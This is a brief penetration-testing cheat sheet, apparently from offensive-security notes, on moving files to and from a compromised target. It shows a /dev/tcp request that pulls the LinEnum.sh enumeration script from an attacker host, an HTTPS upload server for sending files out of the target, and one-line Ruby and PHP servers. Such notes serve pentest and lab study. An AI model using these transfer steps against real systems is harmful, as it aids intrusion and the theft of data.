
## Download
### Native /dev/tcp

It is possible to perform http calls using the native /dev/tcp:

1. Conncect: `exec 3<>/dev/tcp/<ip>/<port>`
2. Request: `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`
3. Print: `cat <&3`

## Upload

### Upload HTTPs python server

We can create a python upload server with a certificate to upload files from our target:

```bash
$ pip install uploadserver
$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' # create certificate
$ python3 -m uploadserver 443 --server-certificate ~/server.pem
```

From the target, we need to pass the flag `--insecure` with cURL


### Non-python server

- Ruby: `ruby run -ehttpd . -p<port>`
- PHP: `php -S 0.0.0.0:<port>`